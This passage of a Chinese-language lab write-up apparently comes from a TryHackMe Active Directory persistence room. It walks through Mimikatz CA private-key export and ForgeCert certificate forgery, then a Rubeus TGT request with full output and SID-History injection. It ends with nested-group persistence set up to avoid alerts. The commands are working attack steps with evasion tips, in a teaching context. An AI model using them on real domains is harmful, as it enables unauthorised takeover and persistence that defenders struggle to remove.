+<th>Service Type</th>
+<th>Service Silver Tickets</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WMI</td>
+<td>HOST RPCSS</td>
+</tr>
+<tr>
+<td>PowerShell Remoting</td>
+<td>HOST HTTP</td>
+</tr>
+<tr>
+<td>WinRM</td>
+<td>HOST HTTP</td>
+</tr>
+<tr>
+<td>Scheduled Tasks</td>
+<td>HOST</td>
+</tr>
+<tr>
+<td>Windows File Share (CIFS)</td>
+<td>CIFS</td>
+</tr>
+<tr>
+<td>LDAP operations includingMimikatz DCSync</td>
+<td>LDAP</td>
+</tr>
+<tr>
+<td>Windows Remote Server Administration Tools</td>
+<td>RPCSS LDAP CIFS</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>上述服务我们都是可以进行伪造的</p>
+<p>并且就是可以利用这些远程的服务进行远程控制  (这里就不写了  在上面的那篇参考文章里面有 可以自己去查看)</p>
+<h3 id="黄金票据和白银票据的区别"><a href="#黄金票据和白银票据的区别" class="headerlink" title="黄金票据和白银票据的区别"></a>黄金票据和白银票据的区别</h3><h5 id="1-访问权限不同"><a href="#1-访问权限不同" class="headerlink" title="1.访问权限不同"></a>1.访问权限不同</h5><ul>
+<li>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限</li>
+<li>Silver Ticket: 伪造TGS,只能访问指定的服务</li>
+</ul>
+<p><strong>2.加密方式不同</strong></p>
+<ul>
+<li>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密</li>
+<li>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</li>
+</ul>
+<h5 id="3-认证流程不同"><a href="#3-认证流程不同" class="headerlink" title="3.认证流程不同"></a>3.认证流程不同</h5><ul>
+<li>Golden Ticket 的利用过程需要访问域控(KDC)</li>
+<li>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</li>
+</ul>
+<h2 id="通过证书实现持久性"><a href="#通过证书实现持久性" class="headerlink" title="通过证书实现持久性"></a>通过证书实现持久性</h2><p>这里的话我们之前的一个房间里也讲过这个证书是什么  当时我们是利用这个证书模板来进行权限提审  获取到了这个管理员账户  </p>
+<h3 id="什么是证书"><a href="#什么是证书" class="headerlink" title="什么是证书"></a>什么是证书</h3><p>AD 证书服务 （CS） 是 Microsoft 的公钥基础结构 （PKI） 实现。由于AD在组织中提供了一定程度的信任，因此它可以用作CA来证明和委托信任。AD CS用于多种用途，例如加密文件系统，创建和验证数字签名，甚至<strong>用户身份验证</strong>，使其成为攻击者的有前途的途径。</p>
+<p>由于 AD CS 是一项特权功能，因此它通常在选定的域控制器上运行。这意味着普通用户无法真正直接与服务交互</p>
+<blockquote>
+<p>CA是证书颁发机构</p>
+</blockquote>
+<p>根据我们的访问权限，我们可以更进一步。我们可以简单地<strong>窃取根 CA 证书的私钥</strong>，以便在我们愿意时<strong>生成我们自己的证书</strong>。更糟糕的是，<strong>由于这些证书从未由CA颁发，蓝队无法撤销它们—(因为这是我们自己生成的 )</strong>。这对蓝队来说会更糟，因为这意味着CA的轮换，这意味着蓝队必须撤销所有颁发的证书才能将我们踢出局。想象一下，您刚刚花了两天时间通过轮换每个特权帐户的凭据，重置所有金票和银票来执行域收回，只是为了意识到攻击者通过成为您的CA来坚持。</p>
+<h3 id="提取私钥"><a href="#提取私钥" class="headerlink" title="提取私钥"></a>提取私钥</h3><p>CA 的私钥存储在 CA 服务器本身上。<strong>如果私钥未通过基于硬件的保护方法（如硬件安全模块 （HSM））进行保护</strong>，对于仅将 Active Directory 证书服务 （AD CS） 用于内部目的的组织来说，这种情况通常如此，则它受计算机数据保护 API （DPAPI） 的保护。这意味着我们可以使用Mimikatz和SharpDPAPI等工具来提取CA证书，从而<strong>从CA中提取私钥</strong></p>
+<h4 id="1-我们先来看看是否可以查看存储在-DC-上的证书："><a href="#1-我们先来看看是否可以查看存储在-DC-上的证书：" class="headerlink" title="1.我们先来看看是否可以查看存储在 DC 上的证书："></a>1.我们先来看看是否可以查看存储在 DC 上的证书：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crypto::certificates /systemstore:local_machine</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ul>
+<li>crypto::certificates: 这是mimikatz的一个模块，用于操作证书相关的功能。</li>
+<li>/systemstore:local_machine: 这是指定操作系统存储区的参数，其中”local_machine”表示本地计算机的系统存储区。</li>
+</ul>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230918111444044.png" alt="image-20230918111444044"></p>
+<p><strong>这里解释一下获取的各个参数的含义</strong></p>
+<blockquote>
+<ul>
+<li>System Store：系统存储区的名称，这里是”local_machine”，表示本地计算机的系统存储区。</li>
+<li>Store：证书存储区的名称，这里是”My”，表示个人证书存储区。</li>
+</ul>
+<p>接下来是一个具体的证书信息：</p>
+<ul>
+<li>Subject：证书的主题，即证书所涉及的实体或组织。</li>
+<li>Issuer：证书的颁发者，即签发该证书的实体或组织。</li>
+<li>Serial：证书的序列号，用于唯一标识证书。</li>
+<li>Algorithm：证书使用的加密算法。</li>
+<li>Validity：证书的有效期，包括起始时间和结束时间。</li>
+<li>Hash SHA1：证书的SHA1哈希值，用于唯一标识证书。</li>
+<li>Key Container：证书的密钥容器，用于存储与该证书关联的密钥。</li>
+<li>Provider：证书的加密提供程序，这里是”Microsoft RSA SChannel Cryptographic Provider”。</li>
+<li>Provider type：提供程序的类型，这里是RSA_SCHANNEL (12)。</li>
+<li>Type：密钥类型，这里是AT_KEYEXCHANGE，表示该证书用于密钥交换。</li>
+<li>Provider name：提供程序的名称。</li>
+<li>Key Container：密钥容器的名称。</li>
+<li>Unique name：密钥容器的唯一名称。</li>
+<li>Implementation：加密实现的类型。</li>
+<li>Algorithm：加密算法的类型。</li>
+<li>Key size：密钥的长度。</li>
+<li>Key permissions：密钥的权限。</li>
+<li>Exportable key：密钥是否可导出。</li>
+</ul>
+</blockquote>
+<p>我们可以看到 DC 上有一个 CA 证书。我们还可以注意到，<strong>其中一些证书设置为不允许我们导出密钥(因为就是Exportable key  为No  所以就不能导出)</strong>。如果没有此私钥，我们将无法生成新证书。幸运的是，Mimikatz 允许我们修补内存以使这些键可导出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">mimikatz # crypto::capi</span><br><span class="line">Local CryptoAPI RSA CSP patched</span><br><span class="line">Local CryptoAPI DSS CSP patched</span><br><span class="line"></span><br><span class="line">mimikatz # crypto::cng</span><br><span class="line">&quot;KeyIso&quot; service patched</span><br><span class="line"></span><br><span class="line">//使用上面的指令修补内存后 我们就可以导出证书了</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crypto::certificates /systemstore:local_machine /export</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230918111933318.png" alt="image-20230918111933318"></p>
+<p>绕过上面的这个<code>Exportable key</code>限制   <strong>成功的导出了证书和私钥</strong></p>
+<p>导出的证书将以 PFX 和 DER 格式存储到磁盘：</p>
+<blockquote>
+<p>‘local<em>machine_My_0</em>.pfx’文件应该包含了私钥和相应的证书，可以用于在其他环境中导入和使用该私钥。</p>
+<p>‘local<em>machine_My_0</em>.der’文件应该包含了一个公钥的导出结果。公钥是在加密和数字签名等过程中使用的关键信息，它可以被其他人使用来验证数字签名或加密数据。导出的公钥文件可以在其他环境中导入并用于进行加密和验证操作。</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230918113528331.png" alt="image-20230918113528331"></p>
+<p>这样子的话我们就能获取到所有证书了</p>
+<p>证书 <code>za-THMDC-CA.pfx</code> 是我们特别感兴趣的证书。为了导出私钥，必须使用密码来加密证书。默认情况下，Mimikatz 分配的密码为 <code>mimikatz</code> </p>
+<h3 id="生成我们自己的证书"><a href="#生成我们自己的证书" class="headerlink" title="生成我们自己的证书"></a>生成我们自己的证书</h3><p>现在我们有了私钥和根CA证书，我们可以使用SpectorOps ForgeCert工具为我们想要的任何用户伪造客户端身份验证证书。<code>ForgeCert</code>和<code>Rubeus</code>二进制文件是我们生成证书要用到的工具</p>
+<p><strong>这里我们在获取到这个管理员证书后  我们可以将这个证书复制到别的低权限用户出 任何来给该用户伪造证书</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>CaCertPath - 导出的 CA 证书的路径。</strong></li>
+<li>CaCertPassword - 用于加密证书的密码。默认情况下，Mimikatz 分配的密码 <code>mimikatz</code> 为 。</li>
+<li><strong>Subject</strong> - 证书的使用者或公用名。这在我们将使用证书的上下文中并不重要。</li>
+<li><strong>SubjectAltName</strong>-这是我们要使用此证书模拟的帐户的用户主体名称 （UPN）。它必须是合法用户。</li>
+<li>NewCertPath - ForgeCert 将存储生成的证书的路径。</li>
+<li>NewCertPassword - 由于证书需要导出私钥进行身份验证，因此我们必须设置用于加密它的新密码。</li>
+</ul>
+<h3 id="验证证书是否伪造成功"><a href="#验证证书是否伪造成功" class="headerlink" title="验证证书是否伪造成功"></a>验证证书是否伪造成功</h3><p>我们可以使用 Rubeus 使用证书请求 TGT，以验证证书是否受信任。我们将使用以下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password123 /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101</span><br></pre></td></tr></table></figure>
+<p>这里的<code>password</code>是上面生成证书用到的<code>NewCertPassword</code>  </p>
+<ul>
+<li>/user - 这指定我们将模拟的用户，并且必须与我们生成的证书的 UPN 匹配</li>
+<li>/enctype - 指定票证的加密类型。设置此项对于规避很重要，因为默认加密算法很弱，这会导致哈希超交警报</li>
+<li>/certificate - 我们生成的证书的路径</li>
+<li>/password - 证书文件的密码</li>
+<li>/outfile - 我们的 TGT 将输出到的文件</li>
+<li>/domain - 我们当前攻击的域的 FQDN</li>
+<li>/dc - 我们从中请求 TGT 的域控制器的 IP。通常，最好选择运行 CA 服务的 DC</li>
+</ul>
+<p>执行命令后，我们应该收到我们的 TGT：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101</span><br><span class="line">          ______        _</span><br><span class="line">         (_____ \      | |</span><br><span class="line">          _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">         |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">         | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">         |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line">       </span><br><span class="line">         v2.0.0</span><br><span class="line">       </span><br><span class="line">       [*] Action: Ask TGT</span><br><span class="line">       </span><br><span class="line">       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert</span><br><span class="line">       [*] Building AS-REQ (w/ PKINIT preauth) for: &#x27;za.tryhackme.loc\Administrator&#x27;</span><br><span class="line">       [+] TGT request successful!</span><br><span class="line">       [*] base64(ticket.kirbi):</span><br><span class="line">       </span><br><span class="line">             doIGADCCBfygAwIBBaEDAgEWooIE+jCCBPZhggTyMIIE7qADAgEFoREbD0xVTkFSLkVSVUNBLkNPTaIk</span><br><span class="line">             MCKgAwIBAqEbMBkbBmtyYnRndBsPbHVuYXIuZXJ1Y2EuY29to4IErDCCBKigAwIBEqEDAgECooIEmgSC</span><br><span class="line">             BJaqEcIY2IcGQKFNgPbDVY0ZXsEdeJAmAL2ARoESt1XvdKC5Y94GECr+FoxztaW2DVmTpou8g116F6mZ</span><br><span class="line">             nSHYrZXEJc5Z84qMGEzEpa38zLGEdSyqIFL9/avtTHqBeqpR4kzY2B/ekqhkUvdb5jqapIK4MkKMd4D/</span><br><span class="line">             MHLr5jqTv6Ze2nwTMAcImRpxE5HSxFKO7efZcz2glEk2mQptLtUq+kdFEhDozHMAuF/wAvCXiQEO8NkD</span><br><span class="line">             zeyabnPAtE3Vca6vfmzVTJnLUKMIuYOi+7DgDHgBVbuXqorphZNl4L6o5NmviXNMYazDybaxKRvzwrSr</span><br><span class="line">             2Ud1MYmJcIsL3DMBa4bxR57Eb5FhOVD29xM+X+lswtWhUO9mUrVyEuHtfV7DUxA94OvX1QmCcas4LXQW</span><br><span class="line">             ggOit/DCJdeyE8JjikZcR1yL4u7g+vwD+SLkusCZE08XDj6lopupt2Hl8j2QLR2ImOJjq54scOllW4lM</span><br><span class="line">             Qek4yqKwP6p0oo4ICxusM8cPwPUxVcYdTCh+BczRTbpoKiFnI+0qOZDtgaJZ/neRdRktYhTsGL39VHB5</span><br><span class="line">             i+kOk3CkcstLfdAP1ck4O+NywDMUK+PhGJM/7ykFe2zICIMaGYGnUDRrad3z8dpQWGPyTBgTvemwS3wW</span><br><span class="line">             NuPbQFFaoyiDiJyXPh+VqivhTUX9st80ZJZWzpE7P1pTNPGq38/6NyLjiE9srbOt6hCLzUaOSMGH1Enf</span><br><span class="line">             SYmNljeW2R0gsFWBaFt16AHfT9G9Et2nOCJn/D/OFePFyR4uJF44p82CmVlBhzOxnCaGtQM2v9lwBqQF</span><br><span class="line">             CcVLjxGXqKrPUr1RUGthP861jhMoXD4jBJ/Q32CkgVdlJRMweqcIfNqP/4mEjbUN5qjNqejYdUb/b5xw</span><br><span class="line">             S794AkaKHcLFvukd41VTm87VvDOp6mM5lID/PLtTCPUZ0zrEb01SNiCdB5IAfnV23vmqsOocis4uZklG</span><br><span class="line">             CNdI1/lsICpS/jaK6NM/0oKehMg+h4VAFLx4HnTSY4ugbrkdxU948qxPEfok/P6umEuny7yTDQFoCUKk</span><br><span class="line">             RuLXbtwwplYTGBDLfzwhcNX8kc/GGLbH9+B8zRXxhd3TGQ7ZT03r798AjobKx024ozt6g4gjS5k/yIT+</span><br><span class="line">             f29XrPzc+UODunO2Qv8JM5NAE3L6ryHp/DdgTaXGBRccgQBeQERNz6wxkdVK6SB7juOjU5JoZ5ZfmTuO</span><br><span class="line">             hQ5hnboH1GvMy4+zeU2P7foWEJE76i9uZMbjUilbWRERYUL/ZjjXQBVWBaxoAdFIoawAzSXUZniNavnS</span><br><span class="line">             n22qqgbd79Zj+lRavAb7Wlk5Gul4G6LMkh2MIJ4JOnrV0JV1yOhoqZ5V6KX/2r7ecyrVZIf2Qf0+ci9G</span><br><span class="line">             vboJiLvWKgXkx7VaKbcLhO743BNYyq57nPNvWhVt3jbFmEq4nTdNou6hQHG4O5hVMhBKGgTwYz3yFPOP</span><br><span class="line">             iuxroniQawSUJbmwObxVeoculPhxEJ69MSgKROTXrKrQAJ84D5QJHQYZus6w+LtodZn1//ZLhgILeFsY</span><br><span class="line">             5K6d4ot2eqEr/A4Vu+wFjGjw87FTvHVcf8HdtGhqkawtPOrzo4HxMIHuoAMCAQCigeYEgeN9geAwgd2g</span><br><span class="line">             gdowgdcwgdSgKzApoAMCARKhIgQgQr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVWhERsPTFVO</span><br><span class="line">             QVIuRVJVQ0EuQ09NohcwFaADAgEBoQ4wDBsKc3ZjLmdpdGxhYqMHAwUAQOEAAKURGA8yMDIyMDIwNjE3</span><br><span class="line">             NTQ0NlqmERgPMjAyMjAyMDcwMzU0NDZapxEYDzIwMjIwMjEzMTc1NDQ2WqgRGw9MVU5BUi5FUlVDQS5D</span><br><span class="line">             T02pJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD2x1bmFyLmVydWNhLmNvbQ=</span><br><span class="line">       </span><br><span class="line">         ServiceName              :  krbtgt/za.tryhackme.loc</span><br><span class="line">         ServiceRealm             :  za.tryhackme.loc</span><br><span class="line">         UserName                 :  Administrator</span><br><span class="line">         UserRealm                :  za.tryhackme.loc</span><br><span class="line">         StartTime                :  2/6/2022 5:54:46 PM</span><br><span class="line">         EndTime                  :  2/7/2022 3:54:46 AM</span><br><span class="line">         RenewTill                :  2/13/2022 5:54:46 PM</span><br><span class="line">         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">         KeyType                  :  aes256_cts_hmac_sha1</span><br><span class="line">         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=</span><br><span class="line">         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED</span><br></pre></td></tr></table></figure>
+<h3 id="验证TGT是否有效"><a href="#验证TGT是否有效" class="headerlink" title="验证TGT是否有效"></a>验证TGT是否有效</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::ptt administrator.kirbi</span><br></pre></td></tr></table></figure>
+<p>然后访问域控共享文件夹</p>
+<p>能访问成功就是有效</p>
+<p><strong>这样的话本地管理员账户就伪造成功了</strong>  这样的话普通用户也具有了管理员的权限 并且这样的话就是即使修改管理员密码也不影响我们证书的使用</p>
+<p>并且就是我们是自己导出私钥来自己生成的证书  那么在AD -CS中是找不到我们的证书的  所以是删除不掉的</p>
+<p>那么想要删除的话就必须删除整个CA来使全部的CS失效才行  这样的话蓝队的工作量就会非常大了  这样子的话还会影响整个域的运行  可能会导致重建系统</p>
+<p><strong>这个就是无需获取hash密码的权限维持</strong></p>
+<h2 id="通过-SID-历史记录保持"><a href="#通过-SID-历史记录保持" class="headerlink" title="通过 SID 历史记录保持"></a>通过 SID 历史记录保持</h2><p>这个的话我在打春秋云镜的Time靶机的时候遇到过   <a target="_blank" rel="noopener" href="https://www.cnblogs.com/f-carey/p/15705635.html">参考文章</a></p>
+<h3 id="SID作用"><a href="#SID作用" class="headerlink" title="SID作用"></a>SID作用</h3><p><strong>SID 用于在连接到资源时跟踪安全主体和帐户的访问权限。但是，帐户上有一个有趣的属性，称为 SID 历史记录  SID History是在域迁移过程中需要使用的一个属性。</strong></p>
+<blockquote>
+<p> 如果A域中的域用户迁移到B域中，那么该用户的SID值就会改变，进而其权限也会改变。导致迁移后的用户无法访问以前可以访问的资源。<strong>SID History的作用是在域迁移过程中保持域用户的访问权限，如果迁移后用户的SID值改变，系统会将原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源—————（这句话就关键了  如果我们拿下域控后  将域控管理员的SID赋值给任意一个低权限用户的话  那么该低权限用户就拥有和域控管理员一样的权限了）</strong>。使用mimikatz可以将SID History属性添加到任意用户的SID History属性中。在渗透测试中，如果获得了域管理员权限（或者等同于域管理员权限），就可以将SID History作为实现持久化的方法。</p>
+</blockquote>
+<h3 id="SID-History利用"><a href="#SID-History利用" class="headerlink" title="SID-History利用"></a>SID-History利用</h3><ol>
+<li>先去查看低权限用户的SID-History是否为空</li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230925102408995.png" alt="image-20230925102408995"></p>
+<p>这确认我们的用户当前未设置任何 SID 历史记录。让我们获取域管理员组的 SID，因为这是我们要添加到 SID 历史记录的组：</p>
+<ol>
+<li>获取域控管理员账户的SID-History</li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230925102604847.png" alt="image-20230925102604847"></p>
+<p>这里的话我们就可以成功获取这个域控管理员的SID了</p>
+<ol>
+<li>添加SID-History</li>
+</ol>
+<p><strong>我们可以使用类似Mimikatz的东西来添加SID历史记录。但是，最新版本的Mimikatz有一个缺陷，不允许它修补LSASS以更新SID历史记录。</strong>因此，我们需要使用其他东西。在这种情况下，我们将使用 DSInternals 工具直接修补 ntds.dit 文件，即存储所有信息的 AD 数据库：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230925103039639.png" alt="image-20230925103039639"></p>
+<blockquote>
+<p>PS C:\Users\Administrator.ZA&gt; Import-Moduls DSInternals</p>
+<p>PS C:\Users\Administrator.ZA&gt;Stop-Service -Name ntds -force  </p>
+<p>PS C:\Users\Administrator.ZA&gt; Add-ADDBSidHistory -SamAccountName ‘username of our low-priveleged AD account’ -SidHistory ‘SID to add to SID History’ -DatabasePath C:\Windows\NTDS\ntds.dit  </p>
+<p>PS C:\Users\Administrator.ZA&gt;Start-Service -Name ntds </p>
+</blockquote>
+<p>这里靶场不知道抽啥风了  报错没成功  反正就是按照上面三步走就行了  </p>
+<p>还有一点就是  如果使用<code>mimikatz</code>的话也是可以的  但是要注意版本  有些版本是不行的  会报错</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230925104200242.png" alt="image-20230925104200242"></p>
+<p>就是会爆出这个错误</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 将高权限的 SID History 属性注入</span><br><span class="line">privilege::debug</span><br><span class="line"># 注入SID之前需要使用以下命令修复NTDS服务，否则无法将高权限的SID注人低权限用户的SID History属性;</span><br><span class="line">sid::patch</span><br><span class="line">sid::add /sam:tester /new:administrator</span><br><span class="line"></span><br><span class="line"># 查看 tester 用户的 SID History 属性</span><br><span class="line">Get-ADUser tester -Properties sidhistory</span><br><span class="line"></span><br><span class="line"># 清除恶意用户的 SID History 属性</span><br><span class="line">sid::clear /sam:username</span><br></pre></td></tr></table></figure>
+<p>mimikatz有些版本就会支持这样做</p>
+<h2 id="通过组成员身份实现持久性"><a href="#通过组成员身份实现持久性" class="headerlink" title="通过组成员身份实现持久性"></a>通过组成员身份实现持久性</h2><p>如果我们不想篡改 SID 历史记录，<strong>可以直接将自己添加到 AD 组中以实现持久性</strong>。虽然 SID 历史记录是一种很好的持久性技术，但凭据轮换和清理仍然可以删除持久性。在某些情况下，最好通过以 AD 组本身为目标来执行持久性。</p>
+<h3 id="通过组成员身份实现持久性-1"><a href="#通过组成员身份实现持久性-1" class="headerlink" title="通过组成员身份实现持久性"></a>通过组成员身份实现持久性</h3><p>特权最高的帐户或组并不总是最适合用于持久性。特权组比其他组更密切地监视更改。任何归类为受保护组的组（如域管理员或企业管理员）都会受到额外的安全审查。因此，如果我们想通过组成员身份坚持下去，我们可能需要在将自己的帐户添加到的组上发挥创意，以实现持久性：</p>
+<h3 id="嵌套组"><a href="#嵌套组" class="headerlink" title="嵌套组"></a>嵌套组</h3><p>这个组才是这里的关键  等会就是使用这个组来进行持久化</p>
+<blockquote>
+<p>在大多数组织中，有大量的递归组。递归组是作为另一个组成员的组。我们可以将其视为群体嵌套。组嵌套用于在 AD 中创建更有条理的结构。以 IT 支持组为例。IT 支持非常通用。因此，也许此组下有帮助台、访问卡管理器和网络管理员等子组。我们可以将所有这些组作为成员添加到 IT 支持组，从而为这些子组中的所有用户提供与 IT 支持组关联的权限和特权，但随后我们可以为每个子组分配更精细的权限和特权。</p>
+</blockquote>
+<p>虽然组嵌套有助于组织 AD，但它确实降低了有效访问的可见性。再次以我们的 IT 支持为例。如果我们向 AD 查询 IT 支持组的成员身份，它将以 3 计数进行响应。但是，这个计数并不真实，因为它是三组。为了了解有效访问，我们现在还必须枚举这些子组。但这些子组也可以有子组。所以问题变成了：“我们应该枚举多少层才能获得真正的有效访问号码？</p>
+<p>这也成为一个监控问题。例如，假设我们有一个警报，当将新成员添加到域管理员组时，该警报会触发。这是一个很好的警报，但如果将用户添加到域管理员组中的子组，则不会触发。这是一个非常常见的问题，因为 AD 由 AD 团队管理，警报和监视由 InfoSec 团队管理。我们所需要的只是一点点沟通不畅，并且警报不再有效，因为使用了子组。</p>
+<p>作为攻击者，我们可以利用这种降低的可见性来执行持久性。我们没有针对为我们提供环境访问权限的特权群体，而是将注意力集中在子群体上。我们不会将自己添加到会引发警报的特权组中，而是将自己添加到未受监视的子组中。</p>
+<p><strong>上面就是为什么要用这个嵌套组的原因了</strong></p>
+<h3 id="利用嵌套组"><a href="#利用嵌套组" class="headerlink" title="利用嵌套组"></a>利用嵌套组</h3><p>让我们模拟这种类型的持久性。为了允许其他用户也执行该技术，请确保在你创建的所有组前面加上您的用户名。为了模拟持久性，我们将创建一些自己的组。让我们首先创建一个新的基本组，我们将隐藏在人员&gt;IT 组织单位 （OU） 中：</p>
+<ol>
+<li>第一步</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt;New-ADGroup -Path &quot;OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 1&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup1&quot; -DisplayName &quot;&lt;username&gt; Nest Group 1&quot; -GroupScope Global -GroupCategory Security</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230925112142504.png" alt="image-20230925112142504"></p>
+<ol>
+<li>第二步</li>
+</ol>
+<p>现在，让我们在人员&gt;销售 OU 中创建另一个组，并将我们以前的组添加为成员：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt;New-ADGroup -Path &quot;OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 2&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup2&quot; -DisplayName &quot;&lt;username&gt; Nest Group 2&quot; -GroupScope Global -GroupCategory Security </span><br><span class="line">PS C:\Users\Administrator.ZA&gt;Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup2&quot; -Members &quot;&lt;username&gt;_nestgroup1&quot;</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230925112326892.png" alt="image-20230925112326892"></p>
+<ol>
+<li>第三步</li>
+</ol>
+<p>我们可以再这样做几次，每次将前一个组添加为成员：</p>
